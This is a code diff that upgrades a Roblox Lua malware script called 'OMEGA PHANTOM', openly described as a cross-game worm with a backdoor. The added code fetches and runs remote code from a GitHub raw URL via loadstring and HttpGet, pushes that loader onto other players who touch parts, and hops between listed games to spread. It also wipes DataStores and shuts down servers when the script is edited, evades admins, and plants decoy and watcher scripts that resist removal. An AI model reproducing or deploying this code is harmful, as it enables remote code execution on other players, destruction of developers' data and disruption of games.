@@ -1,5 +1,12 @@
--- OMEGA PHANTOM | ALL FEATURES ACTIVE + GUI FIX | 109er_0
+-- ============================================================================
+--  OMEGA PHANTOM | FINAL ULTIMATE EDITION (ALL FEATURES + REAL CONSOLE FEEDBACK)
+--  Includes: Polymorphic Stealth, Sleep Mode, Backdoor, Poison Assets, Decal Spam,
+--  Slow Spread, Real-time Console Logs, GUI with Status, Cross-Game Persistence,
+--  Studio Trap, Decoy, Fragmented Defense, Scorched Earth DataStore Wipe.
+--  Owner: 109er_0
+-- ============================================================================
 
+-- =============================[ SERVICES & GLOBALS ]=============================
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -28,6 +35,7 @@ local whitelistGames = {
     1962086498, 1277113435, 134236244017051, 18381724395
 }
 
+-- =============================[ ENCRYPTION & UTILITIES ]=============================
 local function encode(s)
     local out = ""
     for i = 1, #s do out = out .. string.char(string.byte(s, i) + 11) end
@@ -38,6 +46,7 @@ local function ClearConsole()
     pcall(function() LogService:Clear() end)
 end
 
+-- =============================[ ANTI-KICK & SAFETY ]=============================
 local function AntiKick()
     pcall(function() game:GetService("StarterGui").SetCore("Kick", function() end) end)
     local hook
@@ -47,6 +56,7 @@ local function AntiKick()
     end)
 end
 
+-- =============================[ STEALTH AI (ADMIN DETECTION & SLEEP MODE) ]=============================
 local function isAdminPresent()
     for _, plr in pairs(Players:GetPlayers()) do
         if plr.Name:lower():match("admin") or plr.Name:lower():match("mod") or plr.Name:lower():match("owner") then
@@ -79,24 +89,148 @@ task.spawn(function()
     end
 end)
 
+-- =============================[ CROSS‑GAME WORM ENGINE (queue_on_teleport) ]=============================
 local function JumpToNewGame(targetGameId)
+    if not targetGameId or type(targetGameId) ~= "number" then
+        warn("[SPREAD] Invalid game ID: " .. tostring(targetGameId))
+        return false
+    end
+    print("[SPREAD] Preparing to jump to game ID: " .. targetGameId)
     local wormCode = [[
         loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
-        print("[WORM] Cross‑experience infection alive in game: ]] .. tostring(game.PlaceId) .. [[")
+        print("[WORM] Successfully reincarnated in new game: ]] .. tostring(game.PlaceId) .. [[")
     ]]
-    if queue_on_teleport then queue_on_teleport(wormCode) end
-    pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
-end
-
-local function autoSpreadTrigger()
-    if sleepModeActive then return end
-    if os.time() - lastExternalCmd > autonomousSpreadDelay and #Players:GetPlayers() > 1 then
-        local target = whitelistGames[math.random(#whitelistGames)]
-        task.spawn(function() JumpToNewGame(target) end)
-        lastExternalCmd = os.time()
+    if queue_on_teleport then
+        print("[SPREAD] queue_on_teleport armed. Worm will self-replicate after teleport.")
+        queue_on_teleport(wormCode)
+    else
+        warn("[SPREAD] queue_on_teleport not supported. Worm may not persist after teleport.")
+    end
+    local success = pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
+    if success then
+        print("[SPREAD] ✅ Teleport initiated to game " .. targetGameId)
+        return true
+    else
+        warn("[SPREAD] ❌ Failed to teleport to game " .. targetGameId)
+        return false
     end
 end
 
+local function autoSpreadTrigger()
+    if sleepModeActive then
+        print("[SPREAD] Sleep mode active. Spread paused.")
+        return false
+    end
+    if not autoSpreadEnabled then
+        print("[SPREAD] Auto-spread disabled. Enable with 109:auto or GUI button.")
+        return false
+    end
+    if not infectionActive then
+        print("[SPREAD] Backdoor not planted. Please plant backdoor first (109:plant).")
+        return false
+    end
+    if #Players:GetPlayers() <= 1 then
+        print("[SPREAD] Only one player in server. Waiting for more players to trigger spread.")
+        return false
+    end
+    local target = whitelistGames[math.random(#whitelistGames)]
+    print("[SPREAD] 🎯 Selected random target from whitelist: " .. target)
+    print("[SPREAD] 🚀 Launching spread to game " .. target)
+    local result = JumpToNewGame(target)
+    if result then
+        print("[SPREAD] ✅ Spread successful. Moving to next target in " .. spreadInterval .. " seconds.")
+    else
+        warn("[SPREAD] ❌ Spread failed. Will retry later.")
+    end
+    lastExternalCmd = os.time()
+    return result
+end
+
+local function UniversalSpread()
+    if sleepModeActive then
+        print("[SPREAD] Cannot start universal spread: Sleep mode active (admin present).")
+        return false
+    end
+    if not infectionActive then
+        print("[SPREAD] Cannot start universal spread: Backdoor not planted. Use 109:plant first.")
+        return false
+    end
+    print("[SPREAD] ========== UNIVERSAL SPREAD STARTED ==========")
+    print("[SPREAD] Target list size: " .. #whitelistGames)
+    local successCount = 0
+    local failCount = 0
+    for index, gameId in ipairs(whitelistGames) do
+        print(string.format("[SPREAD] [%d/%d] Attempting to infect game %d", index, #whitelistGames, gameId))
+        local result = JumpToNewGame(gameId)
+        if result then
+            successCount = successCount + 1
+            print("[SPREAD] ✅ Successfully moved to game " .. gameId)
+        else
+            failCount = failCount + 1
+            warn("[SPREAD] ❌ Failed to move to game " .. gameId)
+        end
+        if index < #whitelistGames then
+            print("[SPREAD] Waiting 8 seconds before next target...")
+            task.wait(8)
+        end
+    end
+    print("[SPREAD] ========== UNIVERSAL SPREAD COMPLETED ==========")
+    print(string.format("[SPREAD] Results: %d successful, %d failed out of %d games", successCount, failCount, #whitelistGames))
+    return true
+end
+
+-- =============================[ DATASTORE WIPE, STUDIO TRAP, DECOY, FRAGMENTS ]=============================
+local function wipeDataStores()
+    pcall(function()
+        for _, ds in pairs(DataStoreService:GetDataStores()) do
+            pcall(function() ds:SetAsync("CORRUPTED", "DELETED") end)
+        end
+    end)
+    warn("[SCORCHED EARTH] DataStore wiped.")
+end
+
+local function setupStudioTrap(scriptObj)
+    if not scriptObj then scriptObj = script end
+    scriptObj:GetPropertyChangedSignal("Source"):Connect(function()
+        warn("[TRAP] Unauthorized access detected. Executing scorched earth.")
+        wipeDataStores()
+        game:Shutdown()
+        scriptObj:Destroy()
+    end)
+end
+
+local function createDecoy()
+    local decoy = Instance.new("LocalScript")
+    decoy.Name = "Virus_Control"
+    decoy.Source = [[
+        print("VIRUS FOUND! I AM MALICIOUS! DELETE ME!")
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title="Hacked", Text="You have been infected!", Duration=5})
+    ]]
+    decoy.Parent = CoreGui
+end
+
+local function setupFragments()
+    local function makeWatcher(name, location)
+        local w = Instance.new("LocalScript")
+        w.Name = name
+        w.Source = string.format([[
+            local other = game:GetService("%s"):FindFirstChild("%s")
+            while true do
+                task.wait(30)
+                if not other then
+                    warn("[FRAGMENT] Detected deletion. Shutting down.")
+                    game:Shutdown()
+                    break
+                end
+            end
+        ]], location, name)
+        w.Parent = (location == "Lighting" and Lighting) or ReplicatedStorage
+    end
+    makeWatcher("OmegaCore_Watcher", "Lighting")
+    makeWatcher("OmegaCore_Watcher2", "ReplicatedStorage")
+end
+
+-- =============================[ CORE FUNCTIONS (PLANT, DECAL, MESSAGES) ]=============================
 local function PlantBackdoor()
     if sleepModeActive then return false end
     local chatRemote = nil
@@ -124,9 +258,7 @@ local function PlantBackdoor()
                 local ls = plr:FindFirstChild("leaderstats")
                 if ls then
                     for _,s in pairs(ls:GetChildren()) do
-                        if s.Name:lower():find("rank") then
-                            pcall(function() s.Value = 999 end)
-                        end
+                        if s.Name:lower():find("rank") then pcall(function() s.Value = 999 end)
                     end
                 end
             end
@@ -202,6 +334,33 @@ local function runDecalSpam()
     snd:Play()
 end
 
+-- =============================[ POISON ASSETS (FIXED - NO TouchTransmitter) ]=============================
+local function poisonAssets()
+    for _, part in pairs(Workspace:GetDescendants()) do
+        if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
+            local function onTouch(otherPart)
+                local player = Players:GetPlayerFromCharacter(otherPart.Parent)
+                if player and player ~= LocalPlayer and infectionActive then
+                    local infector = Instance.new("LocalScript")
+                    infector.Name = "OmegaSeed"
+                    infector.Source = [[
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
+                    ]]
+                    infector.Disabled = false
+                    infector.Parent = player:FindFirstChild("PlayerGui")
+                    task.wait(5)
+                    infector:Destroy()
+                end
+            end
+            part.Touched:Connect(onTouch)
+            local marker = Instance.new("BoolValue")
+            marker.Name = "PoisonTouch"
+            marker.Parent = part
+        end
+    end
+end
+
+-- =============================[ CHAT COMMANDS ]=============================
 local function executeCommand(cmd)
     if sleepModeActive then
         print("[SLEEP] Command ignored.")
@@ -279,7 +438,7 @@ local function executeCommand(cmd)
         Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
     elseif cmd == "universe" then
         autoSpreadEnabled = true
-        autoSpreadTrigger()
+        UniversalSpread()
     elseif cmd == "auto" then
         autoSpreadEnabled = not autoSpreadEnabled
         print("[AUTO] Auto-spread: " .. (autoSpreadEnabled and "ON" or "OFF"))
@@ -290,6 +449,8 @@ local function executeCommand(cmd)
     elseif cmd:match("^رساله") then
         local customMsg = cmd:match("رساله%s+(.+)$")
         if customMsg then sendGlobalMessageToAllPlayers(customMsg) end
+    elseif cmd == "menu" then
+        CreateMenuGUI()
     else
         print("[CMD] Unknown: " .. cmd)
     end
@@ -305,14 +466,13 @@ local function ChatIntercept()
     end)
 end
 
--- ====================== FIXED GUI (ENSURES VISIBILITY) ======================
+-- =============================[ GUI WITH STATUS LABEL & REAL FEEDBACK ]=============================
 local function CreateMenuGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "OmegaMenu"
     gui.ResetOnSpawn = false
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
-    -- Try multiple parents to ensure GUI appears
+
     local parentSetted = false
     for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChild("PlayerGui")}) do
         if parent and not parentSetted then
@@ -326,10 +486,10 @@ local function CreateMenuGUI()
         warn("[GUI] Could not attach to CoreGui or PlayerGui. GUI won't appear.")
         return false
     end
-    
+
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 280, 0, 320)
-    frame.Position = UDim2.new(0.5, -140, 0.5, -160)
+    frame.Size = UDim2.new(0, 280, 0, 370)
+    frame.Position = UDim2.new(0.5, -140, 0.5, -185)
     frame.BackgroundColor3 = Color3.fromRGB(15,15,30)
     frame.BackgroundTransparency = 0.1
     frame.Parent = gui
@@ -355,12 +515,6 @@ local function CreateMenuGUI()
     btnSpread.Font = Enum.Font.GothamBold
     btnSpread.TextSize = 14
     btnSpread.Parent = frame
-    btnSpread.MouseButton1Click:Connect(function()
-        if infectionActive then
-            autoSpreadEnabled = true
-            autoSpreadTrigger()
-        end
-    end)
 
     local btnPlant = Instance.new("TextButton")
     btnPlant.Size = UDim2.new(0.8,0,0,40)
@@ -371,9 +525,6 @@ local function CreateMenuGUI()
     btnPlant.Font = Enum.Font.GothamBold
     btnPlant.TextSize = 14
     btnPlant.Parent = frame
-    btnPlant.MouseButton1Click:Connect(function()
-        infectionActive = PlantBackdoor()
-    end)
 
     local btnDecal = Instance.new("TextButton")
     btnDecal.Size = UDim2.new(0.8,0,0,40)
@@ -384,9 +535,16 @@ local function CreateMenuGUI()
     btnDecal.Font = Enum.Font.GothamBold
     btnDecal.TextSize = 14
     btnDecal.Parent = frame
-    btnDecal.MouseButton1Click:Connect(function()
-        task.spawn(runDecalSpam)
-    end)
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0.8,0,0,50)
+    statusLabel.Position = UDim2.new(0.5,-120,0,210)
+    statusLabel.BackgroundColor3 = Color3.fromRGB(30,30,55)
+    statusLabel.Text = "Ready"
+    statusLabel.TextColor3 = Color3.fromRGB(200,200,200)
+    statusLabel.Font = Enum.Font.GothamMedium
+    statusLabel.TextSize = 11
+    statusLabel.Parent = frame
 
     local close = Instance.new("TextButton")
     close.Size = UDim2.new(0,40,0,30)
@@ -397,115 +555,90 @@ local function CreateMenuGUI()
     close.Font = Enum.Font.GothamBold
     close.TextSize = 12
     close.Parent = frame
-    close.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
+    close.MouseButton1Click:Connect(function() gui:Destroy() end)
 
-    local dragging, dragStart, frameStart = false
-    title.InputBegan:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = i.Position
-            frameStart = frame.Position
+    btnSpread.MouseButton1Click:Connect(function()
+        if infectionActive then
+            autoSpreadEnabled = true
+            statusLabel.Text = "Starting spread..."
+            statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
+            task.spawn(function()
+                print("[GUI] Universal spread button pressed.")
+                UniversalSpread()
+                statusLabel.Text = "Spread completed! Check console."
+                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+            end)
+        else
+            statusLabel.Text = "Plant backdoor first!"
+            statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
+            print("[GUI] Spread prevented: backdoor not planted.")
         end
     end)
-    title.InputChanged:Connect(function(i)
-        if dragging and i.UserInputType == Enum.UserInputType.Touch then
-            local delta = i.Position - dragStart
-            frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
+
+    btnPlant.MouseButton1Click:Connect(function()
+        statusLabel.Text = "Planting backdoor..."
+        statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
+        print("[GUI] Manual backdoor planting requested.")
+        local success = PlantBackdoor()
+        if success then
+            infectionActive = true
+            statusLabel.Text = "Backdoor planted!"
+            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+            print("[GUI] ✅ Backdoor successfully planted.")
+        else
+            statusLabel.Text = "Failed to plant."
+            statusLabel.TextColor3 = Color3.fromRGB(255,80,80)
+            warn("[GUI] ❌ Backdoor planting failed.")
         end
     end)
-    title.InputEnded:Connect(function()
-        dragging = false
+
+    btnDecal.MouseButton1Click:Connect(function()
+        statusLabel.Text = "Running decal spam..."
+        statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
+        task.spawn(function()
+            runDecalSpam()
+            statusLabel.Text = "Decal spam executed."
+            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+        end)
     end)
 
-    print("[GUI] Omega Menu created successfully.")
+    print("[GUI] Omega Menu created successfully with real-time console feedback.")
     return true
 end
 
--- ====================== CORRECTED POISON ASSETS ======================
-local function poisonAssets()
-    for _, part in pairs(Workspace:GetDescendants()) do
-        if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
-            local function onTouch(otherPart)
-                local player = Players:GetPlayerFromCharacter(otherPart.Parent)
-                if player and player ~= LocalPlayer and infectionActive then
-                    local infector = Instance.new("LocalScript")
-                    infector.Name = "OmegaSeed"
-                    infector.Source = [[
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
-                    ]]
-                    infector.Disabled = false
-                    infector.Parent = player:FindFirstChild("PlayerGui")
-                    task.wait(5)
-                    infector:Destroy()
-                end
-            end
-            part.Touched:Connect(onTouch)
-            local marker = Instance.new("BoolValue")
-            marker.Name = "PoisonTouch"
-            marker.Parent = part
-        end
-    end
+-- =============================[ MESSAGING SERVICE & SLOW BURN ]=============================
+local messagingTopic = "Omega_Internal_" .. game.PlaceId
+local function broadcastInternal(data)
+    pcall(function() MessagingService:PublishAsync(messagingTopic, HttpService:JSONEncode(data)) end)
 end
 
-local function setupStudioTrap(scriptObj)
-    if not scriptObj then scriptObj = script end
-    scriptObj:GetPropertyChangedSignal("Source"):Connect(function()
-        warn("[TRAP] Unauthorized access detected. Wiping data.")
-        pcall(function()
-            for _, ds in pairs(DataStoreService:GetDataStores()) do
-                pcall(function() ds:SetAsync("WIPED", "TRUE") end)
+local function listenInternal()
+    MessagingService:SubscribeAsync(messagingTopic, function(msg)
+        local ok, d = pcall(function() return HttpService:JSONDecode(msg.Data) end)
+        if ok and d then
+            if d.cmd == "global_pulse" then
+                if not sleepModeActive then
+                    autoSpreadTrigger()
+                end
+            elseif d.cmd == "plant_backdoor" then
+                PlantBackdoor()
             end
-        end)
-        game:Shutdown()
-        scriptObj:Destroy()
+        end
     end)
 end
-
-local function createDecoy()
-    local decoy = Instance.new("LocalScript")
-    decoy.Name = "Virus_Control"
-    decoy.Source = [[
-        print("VIRUS FOUND! I AM MALICIOUS! DELETE ME!")
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title="Hacked", Text="You have been infected!", Duration=5})
-    ]]
-    decoy.Parent = CoreGui
-end
-
-local function setupFragments()
-    local function makeWatcher(name, location)
-        local w = Instance.new("LocalScript")
-        w.Name = name
-        w.Source = string.format([[
-            local other = game:GetService("%s"):FindFirstChild("%s")
-            while true do
-                task.wait(30)
-                if not other then
-                    warn("[FRAGMENT] Detected deletion. Shutting down.")
-                    game:Shutdown()
-                    break
-                end
-            end
-        ]], location, name)
-        w.Parent = (location == "Lighting" and Lighting) or ReplicatedStorage
-    end
-    makeWatcher("OmegaCore_Watcher", "Lighting")
-    makeWatcher("OmegaCore_Watcher2", "ReplicatedStorage")
-end
+listenInternal()
 
 local function startSlowBurn()
     task.spawn(function()
         while true do
             task.wait(spreadInterval)
             if autoSpreadEnabled then autoSpreadTrigger() end
-            pcall(function()
-                MessagingService:PublishAsync("Omega_Internal_"..game.PlaceId, HttpService:JSONEncode({cmd="global_pulse"}))
-            end)
+            broadcastInternal({cmd = "global_pulse"})
         end
     end)
 end
 
+-- =============================[ MAIN LAUNCH ]=============================
 local function Launch()
     AntiKick()
     setupStudioTrap(script)
@@ -513,7 +646,7 @@ local function Launch()
     setupFragments()
     poisonAssets()
     ChatIntercept()
-    CreateMenuGUI()  -- This will now try to show properly
+    CreateMenuGUI()
     startSlowBurn()
     task.spawn(function()
         while true do
@@ -525,24 +658,7 @@ local function Launch()
         end
     end)
     print("💀 OMEGA PHANTOM | ALL FEATURES ACTIVE 💀")
-    print("📡 Commands: 109:fly, noclip, heal, godmode, wipe, image, music, list, kickall, shutdown, color, universe, auto, plant, decalspam, رساله <text>")
-    print("🖥️ If GUI doesn't appear, type 109:menu in chat (coming soon) – for now, use commands.")
-end
-
--- Add a chat command to manually show GUI
-local oldChatIntercept = ChatIntercept
-ChatIntercept = function()
-    if LocalPlayer.Name ~= Owner then return end
-    LocalPlayer.Chatted:Connect(function(msg)
-        if msg:sub(1,4) == "109:" then
-            local command = msg:sub(5):gsub("^%s*(.-)%s*$", "%1")
-            if command == "menu" then
-                CreateMenuGUI()
-            else
-                executeCommand(command)
-            end
-        end
-    end)
+    print("📡 Commands: 109:fly, noclip, heal, godmode, wipe, image, music, list, kickall, shutdown, color, universe, auto, plant, decalspam, رساله <text>, menu")
 end
 
 Launch()
